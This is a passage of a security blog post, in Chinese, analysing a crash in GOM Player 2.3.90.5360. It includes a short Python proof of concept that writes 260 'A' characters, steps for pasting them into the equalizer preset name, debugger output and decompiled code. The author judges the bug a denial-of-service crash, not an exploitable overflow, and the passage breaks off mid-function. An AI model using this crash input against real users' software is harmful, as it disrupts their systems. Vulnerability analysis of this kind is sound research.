@@ -1,0 +1,343 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="描述GOM Player（Gretech Online Movie Player）是韩国的GRETECH开发的一款在Windows平台上的免费媒体播放器 软件下载：https://github.com/z1r00/Vulnerability_Analysis/tree/main/GOM_Player Poc： 12345678910exploit = 'A' * 260try:    file =">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GOM Player 2.3.90.5360 - Buffer Overflow">
+<meta property="og:url" content="https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/index.html">
+<meta property="og:site_name" content="z1r0's blog">
+<meta property="og:description" content="描述GOM Player（Gretech Online Movie Player）是韩国的GRETECH开发的一款在Windows平台上的免费媒体播放器 软件下载：https://github.com/z1r00/Vulnerability_Analysis/tree/main/GOM_Player Poc： 12345678910exploit = 'A' * 260try:    file =">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-07-06T09:33:40.000Z">
+<meta property="article:modified_time" content="2024-07-16T10:05:30.924Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="RW">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>GOM Player 2.3.90.5360 - Buffer Overflow</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="z1r0's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;text=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;title=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;is_video=false&amp;description=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GOM Player 2.3.90.5360 - Buffer Overflow&amp;body=Check out this article: https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;title=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;title=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;title=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;title=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;name=GOM Player 2.3.90.5360 - Buffer Overflow&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;t=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        GOM Player 2.3.90.5360 - Buffer Overflow
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-06T09:33:40.000Z" itemprop="datePublished">2024-07-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Poc/">Poc</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/RW/" rel="tag">RW</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>GOM Player（Gretech Online Movie Player）是韩国的GRETECH开发的一款在Windows平台上的免费媒体播放器</p>
+<p>软件下载：<a target="_blank" rel="noopener" href="https://github.com/z1r00/Vulnerability_Analysis/tree/main/GOM_Player">https://github.com/z1r00/Vulnerability_Analysis/tree/main/GOM_Player</a></p>
+<p>Poc：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exploit = <span class="string">'A'</span> * <span class="number">260</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">"exploit.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">    file.write(exploit)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"POC is created"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"POC is not created"</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>触发：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#  - Open GOM Player</span><br><span class="line">#  - Click on the gear icon above to open settings</span><br><span class="line">#  - From the meu that appears, select Audio</span><br><span class="line">#  - Click on Equalizer</span><br><span class="line">#  - Click on the plus sign to go to the "Add EQ preset" screen</span><br><span class="line">#  - Copy the contents of exploit.txt and paste it into the preset name box, then click OK</span><br><span class="line">#  - Crashed!</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这个洞进行深入分析之后发现其实并不是真正意义上的Buffer Overflow，是wcscpy_s函数检测到了错误而主动抛出了异常，目前看来只能当作一个拒绝服务漏洞（bug）</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>此漏洞是由于在添加均衡器预设名称时，当输入的内容大于等于预设名称空间，wcscpy_s检测到当目标缓存区大小无法容纳源字符串时，wcscpy_s函数将主动抛出异常，导致程序崩溃。目标缓存区大小这里是二参传进去的大小，用法是wcscpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source)</p>
+<p>用windbg启动程序，执行GOM.exe，将Poc添加到均衡器预设名称时发生崩溃，windbg此时处于crash现场</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(219c.2778): Security check failure or stack buffer overrun - code c0000409 (!!! second chance !!!)</span><br><span class="line">Subcode: 0x5 FAST_FAIL_INVALID_ARG </span><br><span class="line">eax=00000001 ebx=0b1f0f70 ecx=00000005 edx=00000000 esi=00000022 edi=0b1f0f70</span><br><span class="line">eip=00ee71de esp=01afecc8 ebp=01afece0 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202</span><br><span class="line">GOM32Q_vc120_ReleaseQC+0x6371de:</span><br><span class="line">00ee71de cd29            int     29h</span><br></pre></td></tr></tbody></table></figure>
+
+<p>它断在了_invoke_watson中，回溯堆栈状态</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; kb</span><br><span class="line"> # ChildEBP RetAddr      Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00 01afece0 00ee71cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de</span><br><span class="line">01 01afed04 00ab6a63     01afee0c 00000104 0b1fb610 GOM32Q_vc120_ReleaseQC+0x6371cc</span><br><span class="line">02 01aff058 00a9d040     0b1f39a0 00000001 00db723a GOM32Q_vc120_ReleaseQC+0x206a63</span><br><span class="line">03 01aff11c 00db82e2     0104b640 0b1f39a0 00010004 GOM32Q_vc120_ReleaseQC+0x1ed040</span><br><span class="line">04 01aff13c 00db392f     0000c2f8 0b1f39a0 00010004 GOM32Q_vc120_ReleaseQC+0x5082e2</span><br><span class="line">05 01aff1ac 00db40ea     0b1f0f70 00050672 0000c2f8 GOM32Q_vc120_ReleaseQC+0x50392f</span><br><span class="line">06 01aff1cc 753a16eb     00050672 0000c2f8 0b1f39a0 GOM32Q_vc120_ReleaseQC+0x5040ea</span><br><span class="line">07 01aff1f8 75397b3a     00db40b6 00050672 0000c2f8 USER32!_InternalCallWinProc+0x2b</span><br><span class="line">08 01aff2e0 75396471     00db40b6 00000000 0000c2f8 USER32!UserCallWinProcCheckWow+0x33a</span><br><span class="line">09 01aff35c 75395f90     0000c1f8 01aff398 00dbc591 USER32!DispatchMessageWorker+0x4d1</span><br><span class="line">0a 01aff368 00dbc591     01ec8cd8 00000000 01aff41c USER32!DispatchMessageW+0x10</span><br><span class="line">0b 01aff398 00db2c90     00000004 00060046 01aff41c GOM32Q_vc120_ReleaseQC+0x50c591</span><br><span class="line">0c 01aff3b0 00db2dbb     011d2660 057b64a0 008b0000 GOM32Q_vc120_ReleaseQC+0x502c90</span><br><span class="line">0d 01aff408 009977b2     f571782c 057b64a0 fffffffe GOM32Q_vc120_ReleaseQC+0x502dbb</span><br><span class="line">0e 01aff54c 00c02467     00000006 0000001b ffffffff GOM32Q_vc120_ReleaseQC+0xe77b2</span><br><span class="line">0f 01aff56c 00db9d9e     057b64a0 0000041f 00000000 GOM32Q_vc120_ReleaseQC+0x352467</span><br><span class="line">10 01aff59c 00db5f0e     0000041f 010776f0 00000000 GOM32Q_vc120_ReleaseQC+0x509d9e</span><br><span class="line">11 01aff5ec 00c03f1d     0000041f 00000000 f5717a38 GOM32Q_vc120_ReleaseQC+0x505f0e</span><br><span class="line">12 01aff678 00db6afb     0000041f 00000000 f5717b08 GOM32Q_vc120_ReleaseQC+0x353f1d</span><br><span class="line">13 01aff730 00db82e2     00000111 0000041f 00000000 GOM32Q_vc120_ReleaseQC+0x506afb</span><br><span class="line">14 01aff750 00db392f     00000111 0000041f 00000000 GOM32Q_vc120_ReleaseQC+0x5082e2</span><br><span class="line">15 01aff7c0 00db40ea     057b64a0 00060046 00000111 GOM32Q_vc120_ReleaseQC+0x50392f</span><br><span class="line">16 01aff7e0 753a16eb     00060046 00000111 0000041f GOM32Q_vc120_ReleaseQC+0x5040ea</span><br><span class="line">17 01aff80c 75397b3a     00db40b6 00060046 00000111 USER32!_InternalCallWinProc+0x2b</span><br><span class="line">18 01aff8f4 753972f6     00db40b6 00000000 00000111 USER32!UserCallWinProcCheckWow+0x33a</span><br><span class="line">19 01aff92c 75395b1b     00000111 0000041f 00000000 USER32!CallWindowProcAorW+0x7f</span><br><span class="line">1a 01aff944 009e9a45     00db40b6 00060046 00000111 USER32!CallWindowProcW+0x1b</span><br><span class="line">1b 01aff9ec 753a16eb     00060046 00000111 0000041f GOM32Q_vc120_ReleaseQC+0x139a45</span><br><span class="line">1c 01affa18 75397b3a     009e97c0 00060046 00000111 USER32!_InternalCallWinProc+0x2b</span><br><span class="line">1d 01affb00 75396471     009e97c0 00000000 00000111 USER32!UserCallWinProcCheckWow+0x33a</span><br><span class="line">1e 01affb7c 75395f90     00000011 01affbb4 00dbc591 USER32!DispatchMessageWorker+0x4d1</span><br><span class="line">1f 01affb88 00dbc591     01ec8cd8 00000001 011a17e0 USER32!DispatchMessageW+0x10</span><br><span class="line">20 01affbb4 00f0f850     00ed7d98 0000000a 00000000 GOM32Q_vc120_ReleaseQC+0x50c591</span><br><span class="line">21 01affbc8 00ed7d1e     008b0000 00000000 01ec25da GOM32Q_vc120_ReleaseQC+0x65f850</span><br><span class="line">22 01affc14 764afcc9     0196e000 764afcb0 01affc80 GOM32Q_vc120_ReleaseQC+0x627d1e</span><br><span class="line">23 01affc24 770280ce     0196e000 648bdd27 00000000 KERNEL32!BaseThreadInitThunk+0x19</span><br><span class="line">24 01affc80 7702809e     ffffffff 77049189 00000000 ntdll!__RtlUserThreadStart+0x2f</span><br><span class="line">25 01affc90 00000000     00ed7d98 0196e000 00000000 ntdll!_RtlUserThreadStart+0x1b</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>00ab6a63</code>是漏洞点地址，刚好是wcscpy_s函数，<code>0b1fb610</code>存放了输入的Poc</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dc 0b1fb610</span><br><span class="line">0b1fb610  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb620  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb630  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb640  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb650  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb660  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb670  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0b1fb680  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">0:000&gt; du 0b1fb610</span><br><span class="line">0b1fb610  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb650  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb690  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb6d0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb710  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb750  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb790  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb7d0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><br><span class="line">0b1fb810  "AAAA"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>利用wcscpy_s复制过去之后的数据存放在<code>01afee0c</code>中，很明显的发现头这里是空字节</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dc 01afee0c</span><br><span class="line">01afee0c  00410000 00410041 00410041 00410041  ..A.A.A.A.A.A.A.</span><br><span class="line">01afee1c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee2c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee3c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee4c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee5c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee6c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">01afee7c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>wcscpy_s的函数实现如下，循环复制，直到Source结尾（SizeInWords不为0）或SizeInWords为0。如果SizeInWords不为0，则说明到了Source结尾可以正常返回。如果为0，则说明Source的长度大于等于SizeInWords，将Destination的头数据设置为0并抛出异常，所以上面的<code>01afee0c</code>会出现头字节为0的情况</p>
+<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">errno_t</span> __cdecl <span class="title">wcscpy_s</span><span class="params">(<span class="type">wchar_t</span> *Destination, <span class="type">rsize_t</span> SizeInWords, <span class="type">const</span> <span class="type">wchar_t</span> *Source)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">rsize_t</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">wchar_t</span> *v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">errno_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">wchar_t</span> v7; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">errno_t</span> v8; <span class="comment">// [esp-4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !Destination )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  v3 = SizeInWords;</span><br><span class="line">  <span class="keyword">if</span> ( !SizeInWords )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  v4 = Source;</span><br><span class="line">  <span class="keyword">if</span> ( !Source )</span><br><span class="line">  {</span><br><span class="line">    *Destination = <span class="number">0</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">    v5 = _errno();</span><br><span class="line">    v8 = <span class="number">22</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">    *v5 = v8;</span><br><span class="line">    _invalid_parameter_noinfo();</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    v7 = *v4;</span><br><span class="line">    *(v4 + Destination - Source) = *v4;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    --v3;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( v3 );</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  {</span><br><span class="line">    *Destination = <span class="number">0</span>;</span><br><span class="line">    v5 = _errno();</span><br><span class="line">    v8 = <span class="number">34</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里有个非常明显问题，如果限制大小是0x104，刚好输入符合要求的0x104也会抛出异常。对于本案例，允许输入的大小大于等于0x104，所以只要大于等于0x104都会抛出异常让程序崩溃</p>
+<p>经过调试之后发现，在均衡器预设这里会进入sub_6077E0函数进行表项判断</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; t</span><br><span class="line">eax=012e1678 ebx=0a80ff58 ecx=0a80ff58 edx=00000001 esi=7fffffff edi=7fffffff</span><br><span class="line">eip=00d477e0 esp=004fecec ebp=004fedac iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200293</span><br><span class="line">GOM32Q_vc120_ReleaseQC+0x2077e0:</span><br><span class="line">00d477e0 55              push    ebp</span><br></pre></td></tr></tbody></table></figure>
+
+<p>利用sub_90A38F获取表项ID，+号的表项ID为0x00004b1</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; </span><br><span class="line">eax=00000001 ebx=0a80ff58 ecx=0a90bf90 edx=00000000 esi=0a90bf90 edi=0a80ff58</span><br><span class="line">eip=00d47806 esp=004fece0 ebp=004fece8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246</span><br><span class="line">GOM32Q_vc120_ReleaseQC+0x207806:</span><br><span class="line">00d47806 e8842b3000      call    GOM32Q_vc120_ReleaseQC+0x50a38f (0104a38f)</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=000004b1 ebx=0a80ff58 ecx=00000000 edx=00000000 esi=0a90bf90 edi=0a80ff58</span><br><span class="line">eip=00d4780b esp=004fece0 ebp=004fece8 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206</span><br><span class="line">GOM32Q_vc120_ReleaseQC+0x20780b:</span><br><span class="line">00d4780b 2db1040000      sub     eax,4B1h</span><br></pre></td></tr></tbody></table></figure>
+
+<p>根据表项ID执行对应的操作，+号会去执行sub_606910</p>
+<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __thiscall <span class="title">sub_6077E0</span><span class="params">(HWND *<span class="keyword">this</span>, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &amp;&amp; <span class="built_in">IsWindow</span>(*(a2 + <span class="number">32</span>)) &amp;&amp; a3 == <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v4 = <span class="built_in">sub_90A38F</span>(a2) - <span class="number">1201</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">sub_606BD0</span>(<span class="keyword">this</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    